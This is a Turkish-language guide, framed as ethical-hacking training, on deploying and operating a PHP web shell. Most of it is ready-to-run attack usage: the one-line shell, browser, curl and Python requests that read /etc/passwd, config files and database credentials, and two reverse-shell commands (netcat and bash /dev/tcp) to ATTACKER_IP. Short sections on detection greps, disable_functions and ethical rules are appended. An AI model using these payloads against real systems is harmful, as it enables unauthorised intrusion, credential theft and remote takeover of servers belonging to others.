# Web Shell Kullanım Örnekleri (Eğitim Amaçlı)

## ⚠️ ÖNEMLİ UYARI
Bu örnekler **sadece kendi sistemlerinizi test etmek** ve **etik hacking eğitimi** için kullanılmalıdır. Başkalarının sistemlerine yetkisiz erişim yasadışıdır.

---

## 1. Web Shell Nedir?

Web shell, bir web sunucusunda komut çalıştırmak için kullanılan bir PHP/JSP/ASPX dosyasıdır. Örnek:

```php
<?php system($_GET["cmd"]); ?>
```

Bu dosya sunucuya yüklendiğinde, URL parametresi ile komut çalıştırılabilir.

---

## 2. Web Shell'e Nasıl Erişilir?

### Yöntem 1: Tarayıcı (Browser)

Tarayıcıda şu URL'yi açın:
```
http://target.com/shell.php?cmd=id
```

**Örnek Komutlar:**

#### Temel Bilgi Toplama:
```
http://target.com/shell.php?cmd=id
http://target.com/shell.php?cmd=whoami
http://target.com/shell.php?cmd=pwd
http://target.com/shell.php?cmd=uname -a
http://target.com/shell.php?cmd=cat /etc/passwd
```

#### Dosya İşlemleri:
```
http://target.com/shell.php?cmd=ls -la
http://target.com/shell.php?cmd=cat config.php
http://target.com/shell.php?cmd=find /var/www -name "*.php"
```

#### Network İşlemleri:
```
http://target.com/shell.php?cmd=ifconfig
http://target.com/shell.php?cmd=netstat -tulpn
http://target.com/shell.php?cmd=ps aux
```

---

### Yöntem 2: cURL (Terminal)

```bash
# Temel kullanım
curl "http://target.com/shell.php?cmd=id"

# URL encoding ile (boşluk ve özel karakterler için)
curl "http://target.com/shell.php?cmd=ls%20-la"

# Headers ile
curl -H "User-Agent: Mozilla/5.0" "http://target.com/shell.php?cmd=whoami"

# Output'u dosyaya kaydet
curl "http://target.com/shell.php?cmd=cat%20/etc/passwd" > output.txt
```

---

### Yöntem 3: Python Script

```python
import requests
import urllib.parse

def execute_command(url, command):
    """Web shell üzerinden komut çalıştır"""
    encoded_cmd = urllib.parse.quote(command)
    full_url = f"{url}?cmd={encoded_cmd}"
    
    try:
        response = requests.get(full_url, timeout=10)
        return response.text
    except Exception as e:
        return f"Error: {e}"

# Kullanım
url = "http://target.com/shell.php"
result = execute_command(url, "id")
print(result)

result = execute_command(url, "ls -la /var/www")
print(result)
```

---

## 3. Özel Karakterler ve URL Encoding

### Boşluk ve Özel Karakterler

Web shell'de komut çalıştırırken özel karakterler URL encoding ile gönderilmelidir:

```
Komut: ls -la /var/www
URL:   http://target.com/shell.php?cmd=ls%20-la%20/var/www

Komut: cat /etc/passwd | grep root
URL:   http://target.com/shell.php?cmd=cat%20/etc/passwd%20%7C%20grep%20root
```

### URL Encoding Tablosu:
- Boşluk: `%20` veya `+`
- `|` (pipe): `%7C`
- `&`: `%26`
- `>`: `%3E`
- `<`: `%3C`
- `;`: `%3B`
- `$`: `%24`

---

## 4. Gelişmiş Kullanım Örnekleri

### Birden Fazla Komut (Chaining)

```bash
# Komut zincirleme
curl "http://target.com/shell.php?cmd=id%20%26%26%20whoami%20%26%26%20pwd"

# Output'u dosyaya yazma
curl "http://target.com/shell.php?cmd=cat%20/etc/passwd%20%3E%20/tmp/passwd.txt"

# Pipe kullanımı
curl "http://target.com/shell.php?cmd=ps%20aux%20%7C%20grep%20apache"
```

### Dosya İçeriği Okuma

```bash
# Config dosyası okuma
curl "http://target.com/shell.php?cmd=cat%20config.php"

# Base64 encoding ile (görünmez karakterler için)
curl "http://target.com/shell.php?cmd=cat%20config.php%20%7C%20base64"
```

### Reverse Shell Oluşturma

```bash
# Netcat ile reverse shell
curl "http://target.com/shell.php?cmd=nc%20-e%20/bin/sh%20ATTACKER_IP%204444"

# Bash ile reverse shell
curl "http://target.com/shell.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261"
```

---

## 5. Güvenlik Testi Senaryoları

### Senaryo 1: Sistem Bilgisi Toplama

```bash
# 1. Kullanıcı bilgisi
curl "http://target.com/shell.php?cmd=id"

# 2. Sistem bilgisi
curl "http://target.com/shell.php?cmd=uname%20-a"

# 3. Network bilgisi
curl "http://target.com/shell.php?cmd=ifconfig"

# 4. Çalışan servisler
curl "http://target.com/shell.php?cmd=ps%20aux"
```

### Senaryo 2: Dosya Keşfi

```bash
# Web root dizinini bul
curl "http://target.com/shell.php?cmd=pwd"

# Dosya listesi
curl "http://target.com/shell.php?cmd=ls%20-la"

# Config dosyalarını bul
curl "http://target.com/shell.php?cmd=find%20.%20-name%20'*.php'%20-type%20f"
```

### Senaryo 3: Veritabanı Bilgisi

```bash
# Config dosyasından DB bilgisi
curl "http://target.com/shell.php?cmd=cat%20config.php%20%7C%20grep%20DB_"

# MySQL bağlantısı test
curl "http://target.com/shell.php?cmd=mysql%20-u%20root%20-p%20-e%20'SHOW%20DATABASES;'"
```

---

## 6. Web Shell Tespiti ve Korunma

### Web Shell Tespiti:

```bash
# Web shell dosyalarını bul
find /var/www -name "*.php" -exec grep -l "system\|exec\|shell_exec\|eval" {} \;

# Şüpheli dosyaları tarama
grep -r "system(\$_GET" /var/www/
grep -r "eval(\$_POST" /var/www/
```

### Korunma Yöntemleri:

1. **File Upload Kontrolü**
   - PHP dosyalarının yüklenmesini engelle
   - Dosya tipi kontrolü yap
   - Upload dizinini web root dışında tut

2. **Function Disabling**
   ```php
   // php.ini
   disable_functions = system,exec,shell_exec,passthru,proc_open,popen
   ```

3. **WAF Kullanımı**
   - ModSecurity gibi WAF kullan
   - Şüpheli URL parametrelerini engelle

4. **Log Monitoring**
   - Erişim loglarını izle
   - Anormal pattern'leri tespit et

---

## 7. Etik Hacking İçin Best Practices

✅ **YAPILMASI GEREKENLER:**
- Sadece kendi sistemlerinizi test edin
- Yazılı izin alın (penetration test)
- Sorumlu açıklama (responsible disclosure) uygulayın
- Test sonrası web shell'i kaldırın

❌ **YAPILMAMASI GEREKENLER:**
- Yetkisiz sistemlere erişim
- Üretim ortamlarında test
- Veri silme veya değiştirme
- Web shell'i kötüye kullanma

---

## 8. Örnek Test Senaryosu

```bash
# 1. Web shell'in çalıştığını kontrol et
curl "http://target.com/shell.php?cmd=id"

# 2. Sistem bilgisi topla
curl "http://target.com/shell.php?cmd=uname%20-a"
curl "http://target.com/shell.php?cmd=cat%20/etc/issue"

# 3. Network bilgisi
curl "http://target.com/shell.php?cmd=ifconfig"

# 4. Dosya yapısını keşfet
curl "http://target.com/shell.php?cmd=ls%20-la%20/var/www"

# 5. Config dosyalarını oku
curl "http://target.com/shell.php?cmd=cat%20/var/www/config.php"

# 6. Web shell'i kaldır (test sonrası)
curl "http://target.com/shell.php?cmd=rm%20shell.php"
```

---

## Önemli Notlar

1. **URL Encoding**: Özel karakterler mutlaka encode edilmeli
2. **Timeout**: Uzun süren komutlar timeout verebilir
3. **Output Limiti**: Büyük output'lar kesilebilir
4. **Logging**: Tüm istekler loglanır, dikkatli olun
5. **Detection**: Web shell kullanımı kolayca tespit edilebilir

---

**Bu örnekler sadece eğitim ve kendi sistemlerinizi test etmek içindir!**

